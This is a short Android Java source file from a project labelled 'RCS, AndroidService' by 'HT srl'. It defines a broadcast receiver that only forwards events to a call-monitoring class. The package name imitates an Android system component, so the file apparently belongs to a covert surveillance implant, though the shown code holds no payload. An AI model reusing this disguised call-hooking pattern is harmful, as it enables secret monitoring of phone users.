/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorCall.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/
//
package com.android.syssetup.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;

import com.android.syssetup.Call;
import com.android.syssetup.Core;
import com.android.syssetup.SMain;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.util.Check;

public class BC extends BroadcastReceiver {
	/**
	 * The Constant TAG.
	 */
	private static final String TAG = "BC"; //$NON-NLS-1$

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.content.BroadcastReceiver#onReceive(android.content.Context,
	 * android.content.Intent)
	 */
	@Override
	public void onReceive(Context context, Intent intent) {

		BroadcastMonitorCall.onReceive(context, intent);

	}

}
